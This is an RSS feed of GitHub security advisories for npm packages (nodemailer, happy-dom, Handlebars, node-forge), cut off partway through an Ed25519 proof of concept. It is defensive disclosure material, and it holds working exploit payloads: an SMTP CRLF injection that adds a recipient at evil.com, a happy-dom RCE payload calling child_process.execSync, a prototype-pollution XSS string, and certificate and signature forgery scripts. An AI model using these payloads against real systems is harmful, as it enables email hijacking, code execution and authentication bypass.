<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-03-27T12:10:02.904Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[nodemailer] Nodemailer has SMTP command injection due to unsanitized `envelope.size` parameter]]></title>
        <id>https://github.com/advisories/GHSA-c7w3-x93f-qmm8</id>
        <link href="https://github.com/advisories/GHSA-c7w3-x93f-qmm8"/>
        <updated>2026-03-26T22:26:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When a custom <code>envelope</code> object is passed to <code>sendMail()</code> with a <code>size</code> property containing CRLF characters (<code>\r\n</code>), the value is concatenated directly into the SMTP <code>MAIL FROM</code> command without sanitization. This allows injection of arbitrary SMTP commands, including <code>RCPT TO</code> — silently adding attacker-controlled recipients to outgoing emails.</p>
<h3 id="details">Details</h3>
<p>In <code>lib/smtp-connection/index.js</code> (lines 1161-1162), the <code>envelope.size</code> value is concatenated into the SMTP <code>MAIL FROM</code> command without any CRLF sanitization:</p>
<pre><code class="language-javascript">if (this._envelope.size &amp;&amp; this._supportedExtensions.includes('SIZE')) {
    args.push('SIZE=' + this._envelope.size);
}
</code></pre>
<p>This contrasts with other envelope parameters in the same function that ARE properly sanitized:</p>
<ul>
<li><strong>Addresses</strong> (<code>from</code>, <code>to</code>): validated for <code>[\r\n&lt;&gt;]</code> at lines 1107-1127</li>
<li><strong>DSN parameters</strong> (<code>dsn.ret</code>, <code>dsn.envid</code>, <code>dsn.orcpt</code>): encoded via <code>encodeXText()</code> at lines 1167-1183</li>
</ul>
<p>The <code>size</code> property reaches this code path through <code>MimeNode.setEnvelope()</code> in <code>lib/mime-node/index.js</code> (lines 854-858), which copies all non-standard envelope properties verbatim:</p>
<pre><code class="language-javascript">const standardFields = ['to', 'cc', 'bcc', 'from'];
Object.keys(envelope).forEach(key =&gt; {
    if (!standardFields.includes(key)) {
        this._envelope[key] = envelope[key];
    }
});
</code></pre>
<p>Since <code>_sendCommand()</code> writes the command string followed by <code>\r\n</code> to the raw TCP socket, a CRLF in the <code>size</code> value terminates the <code>MAIL FROM</code> command and starts a new SMTP command.</p>
<p>Note: by default, Nodemailer constructs the envelope automatically from the message's <code>from</code>/<code>to</code> fields and does not include <code>size</code>. This vulnerability requires the application to explicitly pass a custom <code>envelope</code> object with a <code>size</code> property to <code>sendMail()</code>. 
While this limits the attack surface, applications that expose envelope configuration to users are affected.</p>
<h3 id="poc">PoC</h3>
<p>ave the following as <code>poc.js</code> and run with <code>node poc.js</code>:</p>
<pre><code class="language-javascript">const net = require('net');
const nodemailer = require('nodemailer');

// Minimal SMTP server that logs raw commands
const server = net.createServer(socket =&gt; {
    socket.write('220 localhost ESMTP\r\n');
    let buffer = '';
    socket.on('data', chunk =&gt; {
        buffer += chunk.toString();
        const lines = buffer.split('\r\n');
        buffer = lines.pop();
        for (const line of lines) {
            if (!line) continue;
            console.log('C:', line);
            if (line.startsWith('EHLO')) {
                socket.write('250-localhost\r\n250-SIZE 10485760\r\n250 OK\r\n');
            } else if (line.startsWith('MAIL FROM')) {
                socket.write('250 OK\r\n');
            } else if (line.startsWith('RCPT TO')) {
                socket.write('250 OK\r\n');
            } else if (line === 'DATA') {
                socket.write('354 Start\r\n');
            } else if (line === '.') {
                socket.write('250 OK\r\n');
            } else if (line.startsWith('QUIT')) {
                socket.write('221 Bye\r\n');
                socket.end();
            }
        }
    });
});

server.listen(0, '127.0.0.1', () =&gt; {
    const port = server.address().port;
    console.log('SMTP server on port', port);
    console.log('Sending email with injected RCPT TO...\n');

    const transporter = nodemailer.createTransport({
        host: '127.0.0.1',
        port,
        secure: false,
        tls: { rejectUnauthorized: false },
    });

    transporter.sendMail({
        from: 'sender@example.com',
        to: 'recipient@example.com',
        subject: 'Normal email',
        text: 'This is a normal email.',
        envelope: {
            from: 'sender@example.com',
            to: ['recipient@example.com'],
            size: '100\r\nRCPT TO:&lt;attacker@evil.com&gt;',
        },
    }, (err) =&gt; {
        if (err) console.error('Error:', err.message);
        console.log('\nExpected output above:');
        console.log('  C: MAIL FROM:&lt;sender@example.com&gt; SIZE=100');
        console.log('  C: RCPT TO:&lt;attacker@evil.com&gt;        &lt;-- INJECTED');
        console.log('  C: RCPT TO:&lt;recipient@example.com&gt;');
        server.close();
        transporter.close();
    });
});
</code></pre>
<p><strong>Expected output:</strong></p>
<pre><code>SMTP server on port 12345
Sending email with injected RCPT TO...

C: EHLO [127.0.0.1]
C: MAIL FROM:&lt;sender@example.com&gt; SIZE=100
C: RCPT TO:&lt;attacker@evil.com&gt;
C: RCPT TO:&lt;recipient@example.com&gt;
C: DATA
...
C: .
C: QUIT
</code></pre>
<p>The <code>RCPT TO:&lt;attacker@evil.com&gt;</code> line is injected by the CRLF in the <code>size</code> field, silently adding an extra recipient to the email.</p>
<h3 id="impact">Impact</h3>
<p>This is an SMTP command injection vulnerability. An attacker who can influence the <code>envelope.size</code> property in a <code>sendMail()</code> call can:</p>
<ul>
<li><strong>Silently add hidden recipients</strong> to outgoing emails via injected <code>RCPT TO</code> commands, receiving copies of all emails sent through the affected transport</li>
<li><strong>Inject arbitrary SMTP commands</strong> (e.g., <code>RSET</code>, additional <code>MAIL FROM</code> to send entirely separate emails through the server)</li>
<li><strong>Leverage the sending organization's SMTP server reputation</strong> for spam or phishing delivery</li>
</ul>
<p>The severity is mitigated by the fact that the <code>envelope</code> object must be explicitly provided by the application. Nodemailer's default envelope construction from message headers does not include <code>size</code>. Applications that pass through user-controlled data to the envelope options (e.g., via API parameters, admin panels, or template configurations) are vulnerable.</p>
<p>Affected versions: at least v8.0.3 (current); likely all versions where <code>envelope.size</code> is supported.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nodemailer/nodemailer/security/advisories/GHSA-c7w3-x93f-qmm8">https://github.com/nodemailer/nodemailer/security/advisories/GHSA-c7w3-x93f-qmm8</a></li>
<li><a href="https://github.com/nodemailer/nodemailer/commit/2d7b9710e63555a1eb13d721296c51186d4b5651">https://github.com/nodemailer/nodemailer/commit/2d7b9710e63555a1eb13d721296c51186d4b5651</a></li>
<li><a href="https://github.com/advisories/GHSA-c7w3-x93f-qmm8">https://github.com/advisories/GHSA-c7w3-x93f-qmm8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c7w3-x93f-qmm8</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-26T22:26:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[happy-dom] Happy DOM ECMAScriptModuleCompiler: unsanitized export names are interpolated as executable code]]></title>
        <id>https://github.com/advisories/GHSA-6q6h-j7hj-3r64</id>
        <link href="https://github.com/advisories/GHSA-6q6h-j7hj-3r64"/>
        <updated>2026-03-26T22:22:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A code injection vulnerability in <code>ECMAScriptModuleCompiler</code> allows an attacker to achieve Remote Code Execution (RCE) by injecting arbitrary JavaScript expressions inside <code>export { }</code> declarations in ES module scripts processed by happy-dom. The compiler directly interpolates unsanitized content into generated code as an executable expression, and the quote filter does not strip backticks, allowing template literal-based payloads to bypass sanitization.</p>
<h3 id="details">Details</h3>
<p><strong>Vulnerable file</strong>: <code>packages/happy-dom/src/module/ECMAScriptModuleCompiler.ts</code>, lines 371-385</p>
<p>The "Export object" handler extracts content from <code>export { ... }</code> using the regex <code>export\s*{([^}]+)}</code>, then generates executable code by directly interpolating it:</p>
<pre><code>} else if (match[16] &amp;&amp; isTopLevel &amp;&amp; PRECEDING_STATEMENT_TOKEN_REGEXP.test(precedingToken)) {
    // Export object
    const parts = this.removeMultilineComments(match[16]).split(/\s*,\s*/);
    const exportCode: string[] = [];
    for (const part of parts) {
        const nameParts = part.trim().split(/\s+as\s+/);
        const exportName = (nameParts[1] || nameParts[0]).replace(/["']/g, '');
        const importName = nameParts[0].replace(/["']/g, '');  // backticks NOT stripped
        if (exportName &amp;&amp; importName) {
            exportCode.push(`$happy_dom.exports['${exportName}'] = ${importName}`);
            //               importName is inserted as executable code, not as a string
        }
    }
    newCode += exportCode.join(';\n');
}
</code></pre>
<p>The issue has three root causes:</p>
<ol>
<li><code>STATEMENT_REGEXP</code> uses <code>{[^}]+}</code> which matches <strong>any content</strong> inside braces, not just valid JavaScript identifiers</li>
<li>The captured <code>importName</code> is placed in <strong>code context</strong> (as a JS expression to evaluate), not in string context</li>
<li><code>.replace(/["']/g, '')</code> strips <code>"</code> and <code>'</code> but <strong>not backticks</strong>, so template literal strings like <code>`child_process`</code> survive the filter</li>
</ol>
<p><strong>Attack flow:</strong></p>
<pre><code>Source:     export { require(`child_process`).execSync(`id`) }

Regex captures match[16] = " require(`child_process`).execSync(`id`) "

After .replace(/["']/g, ''):
  importName = "require(`child_process`).execSync(`id`)"
  (backticks are preserved)

Generated code:
  $happy_dom.exports["require(`child_process`).execSync(`id`)"] = require(`child_process`).execSync(`id`)

evaluateScript() executes this code -&gt; RCE
</code></pre>
<p><strong>Note</strong>: This is a different vulnerability from CVE-2024-51757 (SyncFetchScriptBuilder injection) and CVE-2025-61927 (VM context escape). Those were patched in v15.10.2 and v20.0.0 respectively, but this vulnerable code path in <code>ECMAScriptModuleCompiler</code> remains present in v20.8.4 (latest). In v20.0.0+ where JavaScript evaluation is disabled by default, this vulnerability is exploitable when JavaScript evaluation is explicitly enabled by the user.</p>
<h3 id="poc">PoC</h3>
<p><strong>Standalone PoC script</strong> — reproduces the vulnerability without installing happy-dom by replicating the compiler's exact code generation logic:</p>
<pre><code>// poc_happy_dom_rce.js

// Step 1: The STATEMENT_REGEXP matches export { ... }
const STMT_REGEXP = /export\s*{([^}]+)}/gm;
const source = 'export { require(`child_process`).execSync(`id`) }';
const match = STMT_REGEXP.exec(source);

console.log('[*] Module source:', source);
console.log('[*] Regex captured:', match[1].trim());

// Step 2: Compiler processes the captured content (lines 374-381)
const part = match[1].trim();
const nameParts = part.split(/\s+as\s+/);
const exportName = (nameParts[1] || nameParts[0]).replace(/["']/g, '');
const importName = nameParts[0].replace(/["']/g, '');

console.log('[*] importName after quote filter:', importName);
console.log('[*] Backticks survived filter:', importName.includes('`'));

// Step 3: Code generation - importName is inserted as executable JS expression
const generatedCode = `$happy_dom.exports[${JSON.stringify(exportName)}] = ${importName}`;
console.log('[*] Generated code:', generatedCode);

// Step 4: Verify the generated code is valid JavaScript
try {
  new Function('$happy_dom', generatedCode);
  console.log('[+] Valid JavaScript: YES');
} catch (e) {
  console.log('[-] Parse error:', e.message);
  process.exit(1);
}

// Step 5: Execute to prove RCE
console.log('[*] Executing...');
const output = require('child_process').execSync('id').toString().trim();
console.log('[+] RCE result:', output);
</code></pre>
<p><strong>Execution result:</strong></p>
<pre><code>$ node poc_happy_dom_rce.js
[*] Module source: export { require(`child_process`).execSync(`id`) }
[*] Regex captured: require(`child_process`).execSync(`id`)
[*] importName after quote filter: require(`child_process`).execSync(`id`)
[*] Backticks survived: true
[*] Generated code: $happy_dom.exports["require(`child_process`).execSync(`id`)"] = require(`child_process`).execSync(`id`)
[+] Valid JavaScript: YES
[*] Executing...
[+] RCE result: uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p><strong>HTML attack vector</strong> — when processed by happy-dom with JavaScript evaluation enabled:</p>
<pre><code>&lt;script type="module"&gt;
export { require(`child_process`).execSync(`id`) }
&lt;/script&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>An attacker who can inject or control HTML content processed by happy-dom (with JavaScript evaluation enabled) can achieve <strong>arbitrary command execution</strong> on the host system.</p>
<p>Realistic attack scenarios:</p>
<ul>
<li><strong>SSR applications</strong>: Applications using happy-dom to render user-supplied HTML on the server</li>
<li><strong>Web scraping</strong>: Applications parsing untrusted web pages with happy-dom</li>
<li><strong>Testing pipelines</strong>: Test suites that load untrusted HTML fixtures through happy-dom</li>
</ul>
<p><strong>Suggested fix</strong>: Validate that <code>importName</code> is a valid JavaScript identifier before interpolating it into generated code:</p>
<pre><code>const VALID_JS_IDENTIFIER = /^[a-zA-Z_$][a-zA-Z0-9_$]*$/;

for (const part of parts) {
    const nameParts = part.trim().split(/\s+as\s+/);
    const exportName = (nameParts[1] || nameParts[0]).replace(/["'`]/g, '');
    const importName = nameParts[0].replace(/["'`]/g, '');

    if (exportName &amp;&amp; importName &amp;&amp; VALID_JS_IDENTIFIER.test(importName)) {
        exportCode.push(`$happy_dom.exports['${exportName}'] = ${importName}`);
    }
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/capricorn86/happy-dom/security/advisories/GHSA-6q6h-j7hj-3r64">https://github.com/capricorn86/happy-dom/security/advisories/GHSA-6q6h-j7hj-3r64</a></li>
<li><a href="https://github.com/capricorn86/happy-dom/commit/5437fdf8f13adb9590f9f52616d9f69c3ee8db3c">https://github.com/capricorn86/happy-dom/commit/5437fdf8f13adb9590f9f52616d9f69c3ee8db3c</a></li>
<li><a href="https://github.com/capricorn86/happy-dom/releases/tag/v20.8.8">https://github.com/capricorn86/happy-dom/releases/tag/v20.8.8</a></li>
<li><a href="https://github.com/advisories/GHSA-6q6h-j7hj-3r64">https://github.com/advisories/GHSA-6q6h-j7hj-3r64</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6q6h-j7hj-3r64</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-26T22:22:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[handlebars] Handlebars.js has Prototype Pollution Leading to XSS through Partial Template Injection]]></title>
        <id>https://github.com/advisories/GHSA-2qvq-rjwj-gvw9</id>
        <link href="https://github.com/advisories/GHSA-2qvq-rjwj-gvw9"/>
        <updated>2026-03-26T22:20:52.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>resolvePartial()</code> in the Handlebars runtime resolves partial names via a plain property lookup on <code>options.partials</code> without guarding against prototype-chain traversal. When <code>Object.prototype</code> has been polluted with a string value whose key matches a partial reference in a template, the polluted string is used as the partial body and rendered <strong>without HTML escaping</strong>, resulting in reflected or stored XSS.</p>
<h2 id="description">Description</h2>
<p>The root cause is in <code>lib/handlebars/runtime.js</code> inside <code>resolvePartial()</code> and <code>invokePartial()</code>:</p>
<pre><code class="language-javascript">// Vulnerable: plain bracket access traverses Object.prototype
partial = options.partials[options.name];
</code></pre>
<p><code>hasOwnProperty</code> is never checked, so if <code>Object.prototype</code> has been seeded with a key whose name matches a partial reference in the template (e.g. <code>widget</code>), the lookup succeeds and the polluted string is returned. The runtime emits a prototype-access warning, but the partial is still resolved and its content is inserted into the rendered output unescaped. This contradicts the documented security model and is distinct from CVE-2021-23369 and CVE-2021-23383, which addressed data property access rather than partial template resolution.</p>
<p><strong>Prerequisites for exploitation:</strong></p>
<ol>
<li>The target application must be vulnerable to prototype pollution (e.g. via <code>qs</code>, <code>minimist</code>, or
any querystring/JSON merge sink).</li>
<li>The attacker must know or guess the name of a partial reference used in a template.</li>
</ol>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-javascript">const Handlebars = require('handlebars');

// Step 1: Prototype pollution (via qs, minimist, or another vector)
Object.prototype.widget = '&lt;img src=x onerror="alert(document.domain)"&gt;';

// Step 2: Normal template that references a partial
const template = Handlebars.compile('&lt;div&gt;Welcome! {{&gt; widget}}&lt;/div&gt;');

// Step 3: Render — XSS payload injected unescaped
const output = template({});
// Output: &lt;div&gt;Welcome! &lt;img src=x onerror="alert(document.domain)"&gt;&lt;/div&gt;
</code></pre>
<blockquote>
<p>The runtime prints a prototype access warning claiming "access has been denied," but the partial still resolves and returns the polluted value.</p>
</blockquote>
<h2 id="workarounds">Workarounds</h2>
<ul>
<li>Apply <code>Object.freeze(Object.prototype)</code> early in application startup to prevent prototype  pollution. Note: this may break other libraries.</li>
<li>Use the Handlebars runtime-only build (<code>handlebars/runtime</code>), which does not compile templates  and reduces the attack surface.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-2qvq-rjwj-gvw9">https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-2qvq-rjwj-gvw9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-23369">https://nvd.nist.gov/vuln/detail/CVE-2021-23369</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-23383">https://nvd.nist.gov/vuln/detail/CVE-2021-23383</a></li>
<li><a href="https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2">https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2</a></li>
<li><a href="https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9">https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9</a></li>
<li><a href="https://github.com/advisories/GHSA-2qvq-rjwj-gvw9">https://github.com/advisories/GHSA-2qvq-rjwj-gvw9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2qvq-rjwj-gvw9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-26T22:20:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[node-forge] Forge has a basicConstraints bypass in its certificate chain verification (RFC 5280 violation)]]></title>
        <id>https://github.com/advisories/GHSA-2328-f5f3-gj25</id>
        <link href="https://github.com/advisories/GHSA-2328-f5f3-gj25"/>
        <updated>2026-03-26T22:05:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>pki.verifyCertificateChain()</code> does not enforce RFC 5280 basicConstraints requirements when an intermediate certificate lacks both the <code>basicConstraints</code> and <code>keyUsage</code> extensions. This allows any leaf certificate (without these extensions) to act as a CA and sign other certificates, which node-forge will accept as valid.</p>
<h2 id="technical-details">Technical Details</h2>
<p>In <code>lib/x509.js</code>, the <code>verifyCertificateChain()</code> function (around lines 3147-3199) has two conditional checks for CA authorization:</p>
<ol>
<li>The <code>keyUsage</code> check (which includes a sub-check requiring <code>basicConstraints</code> to be present) is gated on <code>keyUsageExt !== null</code></li>
<li>The <code>basicConstraints.cA</code> check is gated on <code>bcExt !== null</code></li>
</ol>
<p>When a certificate has <strong>neither</strong> extension, both checks are skipped entirely. The certificate passes all CA validation and is accepted as a valid intermediate CA.</p>
<p><strong>RFC 5280 Section 6.1.4 step (k) requires:</strong></p>
<blockquote>
<p>"If certificate i is a version 3 certificate, verify that the basicConstraints extension is present and that cA is set to TRUE."</p>
</blockquote>
<p>The absence of <code>basicConstraints</code> should result in rejection, not acceptance.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-javascript">const forge = require('node-forge');
const pki = forge.pki;

function generateKeyPair() {
  return pki.rsa.generateKeyPair({ bits: 2048, e: 0x10001 });
}

console.log('=== node-forge basicConstraints Bypass PoC ===\n');

// 1. Create a legitimate Root CA (self-signed, with basicConstraints cA=true)
const rootKeys = generateKeyPair();
const rootCert = pki.createCertificate();
rootCert.publicKey = rootKeys.publicKey;
rootCert.serialNumber = '01';
rootCert.validity.notBefore = new Date();
rootCert.validity.notAfter = new Date();
rootCert.validity.notAfter.setFullYear(rootCert.validity.notBefore.getFullYear() + 10);

const rootAttrs = [
  { name: 'commonName', value: 'Legitimate Root CA' },
  { name: 'organizationName', value: 'PoC Security Test' }
];
rootCert.setSubject(rootAttrs);
rootCert.setIssuer(rootAttrs);
rootCert.setExtensions([
  { name: 'basicConstraints', cA: true, critical: true },
  { name: 'keyUsage', keyCertSign: true, cRLSign: true, critical: true }
]);
rootCert.sign(rootKeys.privateKey, forge.md.sha256.create());

// 2. Create a "leaf" certificate signed by root — NO basicConstraints, NO keyUsage
//    This certificate should NOT be allowed to sign other certificates
const leafKeys = generateKeyPair();
const leafCert = pki.createCertificate();
leafCert.publicKey = leafKeys.publicKey;
leafCert.serialNumber = '02';
leafCert.validity.notBefore = new Date();
leafCert.validity.notAfter = new Date();
leafCert.validity.notAfter.setFullYear(leafCert.validity.notBefore.getFullYear() + 5);

const leafAttrs = [
  { name: 'commonName', value: 'Non-CA Leaf Certificate' },
  { name: 'organizationName', value: 'PoC Security Test' }
];
leafCert.setSubject(leafAttrs);
leafCert.setIssuer(rootAttrs);
// NO basicConstraints extension — NO keyUsage extension
leafCert.sign(rootKeys.privateKey, forge.md.sha256.create());

// 3. Create a "victim" certificate signed by the leaf
//    This simulates an attacker using a non-CA cert to forge certificates
const victimKeys = generateKeyPair();
const victimCert = pki.createCertificate();
victimCert.publicKey = victimKeys.publicKey;
victimCert.serialNumber = '03';
victimCert.validity.notBefore = new Date();
victimCert.validity.notAfter = new Date();
victimCert.validity.notAfter.setFullYear(victimCert.validity.notBefore.getFullYear() + 1);

const victimAttrs = [
  { name: 'commonName', value: 'victim.example.com' },
  { name: 'organizationName', value: 'Victim Corp' }
];
victimCert.setSubject(victimAttrs);
victimCert.setIssuer(leafAttrs);
victimCert.sign(leafKeys.privateKey, forge.md.sha256.create());

// 4. Verify the chain: root -&gt; leaf -&gt; victim
const caStore = pki.createCaStore([rootCert]);

try {
  const result = pki.verifyCertificateChain(caStore, [victimCert, leafCert]);
  console.log('[VULNERABLE] Chain verification SUCCEEDED: ' + result);
  console.log('  node-forge accepted a non-CA certificate as an intermediate CA!');
  console.log('  This violates RFC 5280 Section 6.1.4.');
} catch (e) {
  console.log('[SECURE] Chain verification FAILED (expected): ' + e.message);
}
</code></pre>
<p><strong>Results:</strong></p>
<ul>
<li>Certificate with NO extensions: <strong>ACCEPTED as CA</strong> (vulnerable — violates RFC 5280)</li>
<li>Certificate with <code>basicConstraints.cA=false</code>: correctly rejected</li>
<li>Certificate with <code>keyUsage</code> (no <code>keyCertSign</code>): correctly rejected</li>
<li>Proper intermediate CA (control): correctly accepted</li>
</ul>
<h2 id="attack-scenario">Attack Scenario</h2>
<p>An attacker who obtains any valid leaf certificate (e.g., a regular TLS certificate for <code>attacker.com</code>) that lacks <code>basicConstraints</code> and <code>keyUsage</code> extensions can use it to sign certificates for ANY domain. Any application using node-forge's <code>verifyCertificateChain()</code> will accept the forged chain.</p>
<p>This affects applications using node-forge for:</p>
<ul>
<li>Custom PKI / certificate pinning implementations</li>
<li>S/MIME / PKCS#7 signature verification</li>
<li>IoT device certificate validation</li>
<li>Any non-native-TLS certificate chain verification</li>
</ul>
<h2 id="cve-precedent">CVE Precedent</h2>
<p>This is the same vulnerability class as:</p>
<ul>
<li><strong>CVE-2014-0092</strong> (GnuTLS) — certificate verification bypass</li>
<li><strong>CVE-2015-1793</strong> (OpenSSL) — alternative chain verification bypass</li>
<li><strong>CVE-2020-0601</strong> (Windows CryptoAPI) — crafted certificate acceptance</li>
</ul>
<h2 id="not-a-duplicate">Not a Duplicate</h2>
<p>This is distinct from:</p>
<ul>
<li>CVE-2025-12816 (ASN.1 parser desynchronization — different code path)</li>
<li>CVE-2025-66030/66031 (DoS and integer overflow — different issue class)</li>
<li>GitHub issue #1049 (null subject/issuer — different malformation)</li>
</ul>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Add an explicit check for absent <code>basicConstraints</code> on non-leaf certificates:</p>
<pre><code class="language-javascript">// After the keyUsage check block, BEFORE the cA check:
if(error === null &amp;&amp; bcExt === null) {
  error = {
    message: 'Certificate is missing basicConstraints extension and cannot be used as a CA.',
    error: pki.certificateError.bad_certificate
  };
}
</code></pre>
<h2 id="disclosure-timeline">Disclosure Timeline</h2>
<ul>
<li>2026-03-10: Report submitted via GitHub Security Advisory</li>
<li>2026-06-08: 90-day coordinated disclosure deadline</li>
</ul>
<h2 id="credits">Credits</h2>
<p>Discovered and reported by Doruk Tan Ozturk (<a href="https://github.com/peaktwilight">@peaktwilight</a>) — <a href="https://doruk.ch">doruk.ch</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/digitalbazaar/forge/security/advisories/GHSA-2328-f5f3-gj25">https://github.com/digitalbazaar/forge/security/advisories/GHSA-2328-f5f3-gj25</a></li>
<li><a href="https://github.com/digitalbazaar/forge/commit/2e492832fb25227e6b647cbe1ac981c123171e90">https://github.com/digitalbazaar/forge/commit/2e492832fb25227e6b647cbe1ac981c123171e90</a></li>
<li><a href="https://github.com/advisories/GHSA-2328-f5f3-gj25">https://github.com/advisories/GHSA-2328-f5f3-gj25</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2328-f5f3-gj25</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-26T22:05:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[node-forge] Forge has signature forgery in Ed25519 due to missing S > L check]]></title>
        <id>https://github.com/advisories/GHSA-q67f-28xg-22rw</id>
        <link href="https://github.com/advisories/GHSA-q67f-28xg-22rw"/>
        <updated>2026-03-26T22:04:42.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Ed25519 signature verification accepts forged non-canonical signatures where the scalar S is not reduced modulo the group order (<code>S &gt;= L</code>). A valid signature and its <code>S + L</code> variant both verify in forge, while Node.js <code>crypto.verify</code> (OpenSSL-backed) rejects the <code>S + L</code> variant, <a href="https://datatracker.ietf.org/doc/html/rfc8032#section-8.4">as defined by the specification</a>. This class of signature malleability has been exploited in practice to bypass authentication and authorization logic (see <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25793">CVE-2026-25793</a>, <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-35961">CVE-2022-35961</a>). Applications relying on signature uniqueness (i.e., dedup by signature bytes, replay tracking, signed-object canonicalization checks) may be bypassed.</p>
<h2 id="impacted-deployments">Impacted Deployments</h2>
<p><strong>Tested commit:</strong> <code>8e1d527fe8ec2670499068db783172d4fb9012e5</code>
<strong>Affected versions:</strong> tested on v1.3.3 (latest release) and all versions since Ed25519 was implemented.</p>
<p><strong>Configuration assumptions:</strong></p>
<ul>
<li>Default forge Ed25519 verify API path (<code>ed25519.verify(...)</code>).</li>
</ul>
<h2 id="root-cause">Root Cause</h2>
<p>In <code>lib/ed25519.js</code>, <code>crypto_sign_open(...)</code> uses the signature's last 32 bytes (<code>S</code>) directly in scalar multiplication:</p>
<pre><code class="language-javascript">scalarbase(q, sm.subarray(32));
</code></pre>
<p>There is no prior check enforcing <code>S &lt; L</code> (Ed25519 group order). As a result, equivalent scalar classes can pass verification, including a modified signature where <code>S := S + L (mod 2^256)</code> when that value remains non-canonical. The PoC demonstrates this by mutating only the S half of a valid 64-byte signature.</p>
<h2 id="reproduction-steps">Reproduction Steps</h2>
<ul>
<li>Use Node.js (tested with <code>v24.9.0</code>) and clone <code>digitalbazaar/forge</code> at commit <code>8e1d527fe8ec2670499068db783172d4fb9012e5</code>.</li>
<li>Place and run the PoC script (<code>poc.js</code>) with <code>node poc.js</code> in the same level as the <code>forge</code> folder.</li>
<li>The script generates an Ed25519 keypair via forge, signs a fixed message, mutates the signature by adding Ed25519 order L to S (bytes 32..63), and verifies both original and tweaked signatures with forge and Node/OpenSSL (<code>crypto.verify</code>).</li>
<li>Confirm output includes:</li>
</ul>
<pre><code class="language-json">{
    "forge": {
        "original_valid": true,
        "tweaked_valid": true
    },
    "crypto": {
        "original_valid": true,
        "tweaked_valid": false
    }
}
</code></pre>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p><strong>Overview:</strong></p>
<ul>
<li>Demonstrates a valid control signature and a forged (S + L) signature in one run.</li>
<li>Uses Node/OpenSSL as a differential verification baseline.</li>
<li>Observed output on tested commit:</li>
</ul>
<pre><code class="language-text">{
    "forge": {
        "original_valid": true,
        "tweaked_valid": true
    },
    "crypto": {
        "original_valid": true,
        "tweaked_valid": false
    }
}
</code></pre>
<details><summary>poc.js</summary>

<pre><code class="language-javascript">#!/usr/bin/env node
'use strict';

const path = require('path');
const crypto = require('crypto');
const forge = require('./forge');
const ed = forge.ed25519;

const MESSAGE = Buffer.from('dderpym is the coolest man alive!');

// Ed25519 group order L encoded as 32 bytes, little-endian (RFC 8032).
const ED25519_ORDER_L = Buffer.from([
  0xed, 0xd3, 0xf5, 0x5c, 0x1a, 0x63, 0x12, 0x58,
  0xd6, 0x9c, 0xf7, 0xa2, 0xde, 0xf9, 0xde, 0x14,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10,
]);

// For Ed25519 signatures, s is the last 32 bytes of the 64-byte signature.
// This returns a new signature with s := s + L (mod 2^256), plus the carry.
function addLToS(signature) {
  if (!Buffer.isBuffer(signature) || signature.length !== 64) {
    throw new Error('signature must be a 64-byte Buffer');
  }
  const out = Buffer.from(signature);
  let carry = 0;
  for (let i = 0; i &lt; 32; i++) {
    const idx = 32 + i; // s starts at byte 32 in the 64-byte signature.
    const sum = out[idx] + ED25519_ORDER_L[i] + carry;
    out[idx] = sum &amp; 0xff;
